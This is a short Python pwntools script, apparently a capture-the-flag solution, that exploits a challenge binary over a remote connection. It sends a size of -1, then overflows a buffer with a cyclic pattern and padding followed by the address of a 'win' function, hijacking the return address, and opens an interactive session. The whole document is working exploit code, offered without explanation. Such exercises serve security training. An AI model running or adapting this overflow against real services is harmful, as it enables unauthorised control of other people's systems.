from pwn import *

BINARY = './dist/chall'

context.log_level = 'debug'
context.binary = BINARY

e = ELF(BINARY)
# r = process(BINARY)
r = remote('117.53.46.98',  10000)

r.sendlineafter(b'size: ', b'-1')
r.sendline(flat([
    cyclic(256),
    cyclic(8),
    # cyclic(8),
    e.sym['win']
]))

r.interactive()
